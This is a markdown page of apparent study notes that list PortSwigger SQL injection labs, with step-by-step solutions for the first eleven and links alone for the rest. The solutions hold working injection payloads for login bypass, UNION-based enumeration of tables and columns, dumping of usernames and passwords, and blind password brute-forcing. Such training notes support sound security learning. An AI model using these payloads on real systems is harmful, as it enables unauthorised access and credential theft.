# 🧪 Labs

## Portswigger

1. [SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)
    - Apply category filter in the products list page.
    - Intercept the request and append `'+OR+1=1--` after the category name.

2. [SQL injection vulnerability allowing login bypass](https://portswigger.net/web-security/sql-injection/lab-login-bypass)
    - In the login page enter `administrator'--` as username and any string as password.

3. [SQL injection attack, querying the database type and version on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle)
    - Apply category filter in the products list page.
    - Intercept the request and append `'+UNION+SELECT+banner,NULL+FROM+v$version+--` after the category name.

4. [SQL injection attack, querying the database type and version on MySQL and Microsoft](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft)
    - Apply category filter in the products list page.
    - Intercept the request and append `'+UNION+SELECT+@@version,NULL#` after the category name.


5. [SQL injection attack, listing the database contents on non-Oracle databases](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)
    - Apply category filter in the products list page.
    - Intercept the request and send to repeater.
    - Append `'+UNION+SELECT+NULL,NULL+FROM+information_schema.tables--` after the category name to find the number of tables.
    - Append `'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--` to find the table names.
    - Append `'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users_ddrxau'--` to find the column names.
    - Append `'+UNION+SELECT+username_avurfo,password_jpfjxw+FROM+users_ddrxau--` to get the username and password and login as administrator.

6. [SQL injection attack, listing the database contents on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle)
    - Apply category filter in the products list page.
    - Intercept the request and send to repeater.
    - Append `'+UNION+SELECT+NULL,NULL+FROM+all_tables--` after the category name to find the number of tables.
    - Append `'+UNION+SELECT+table_name,NULL+FROM+all_tables--` to find the table names.
    - Append `'+UNION+SELECT+COLUMN_NAME,NULL+FROM+all_tab_columns+WHERE+TABLE_NAME='USERS_RQSUHA'--` to find the column names.
    - Append `'+UNION+SELECT+USERNAME_SLQETZ,PASSWORD_VEZXAZ+FROM+USERS_RQSUHA--` to get the username and password and login as administrator.

7. [SQL injection UNION attack, determining the number of columns returned by the query](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)
    - Apply category filter in the products list page.
    - Intercept the request and send to repeater.
    - Append `'UNION+SELECT+NULL,NULL,NULL--` after the category name to find the number of columns in a table.

8. [SQL injection UNION attack, finding a column containing text](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text)
    - Apply category filter in the products list page.
    - Intercept the request and send to repeater.
    - Append `'UNION+SELECT+'abc',NULL--` after the category name to find the column containing text.
9. [SQL injection UNION attack, retrieving data from other tables](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)
    - Apply category filter in the products list page.
    - Intercept the request and send to repeater.
    - Append `'UNION+SELECT+username,password+FROM+users--` after the category name to retrieve data from users table.

10. [SQL injection UNION attack, retrieving multiple values in a single column](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column)
    - Apply category filter in the products list page.
    - Intercept the request and send to repeater.
    - Append `'UNION+SELECT+NULL,username||password+FROM+users--` after the category name to get multiple values from a single column.

11. [Blind SQL injection with conditional responses](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)
    - Apply category filter in the products list page.
    - Intercept the request and send to repeater.
    - Append `' AND (SELECT SUBSTRING(password, §1§, 1) FROM USERS WHERE username='administrator')='§a§; to the tracking Id`
    - Send to intruder and fuzz the indicated locations and find the password and login as administrator.
    
12. [Blind SQL injection with conditional errors](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)

13. [Visible error-based SQL injection](https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based)

14. [Blind SQL injection with time delays](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays)

15. [Blind SQL injection with time delays and information retrieval](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval)

16. [Blind SQL injection with out-of-band interaction](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band)

17. [Blind SQL injection with out-of-band data exfiltration](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration)

18. [SQL injection with filter bypass via XML encoding](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)
